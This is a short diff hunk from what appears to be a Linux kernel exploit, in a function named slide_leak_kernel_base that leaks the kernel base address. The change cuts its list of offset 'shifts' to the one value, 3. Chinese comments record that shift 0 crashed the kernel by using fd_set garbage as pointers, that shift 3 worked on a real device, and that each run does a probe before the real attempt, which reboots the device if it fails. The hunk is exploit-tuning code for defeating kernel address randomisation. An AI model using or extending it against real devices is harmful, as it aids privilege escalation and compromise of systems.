@@ -738,7 +738,14 @@ int slide_leak_kernel_base(void) {
     fixed_shift = (int)strtol(env, NULL, 10);
     pr_info("slide SLIDE_SHIFT=%d (fixed)\n", fixed_shift);
   }
-  int shifts[] = {3, 0, 1, 2, -1, -2};
+  /* 单 shift 单跑(防连环重启):
+   * - shift=0 已实测 NICE-ENTER panic:假标签错位,pi_blocked_on 残留处
+   *   读到 fd_set 垃圾字段(prio 0x8200000003 等)当指针用。
+   * - shift=3 是真机验证值,但修复(rbtree 染色)后的真跑从未执行:
+   *   每次运行 attempt1=PROBE 彩排, attempt2 才真跑 —— 崩了设备重启,
+   *   下一个 shift 永远轮不到,所以这里只留 shift=3。
+   * - 换 shift 用 SLIDE_SHIFT=n 环境变量单点验证。 */
+  int shifts[] = {3};
   int n_shifts = sizeof(shifts) / sizeof(shifts[0]);
 
   /* attempt 1 = safe probe: consumer never calls sched_setattr, so the PI
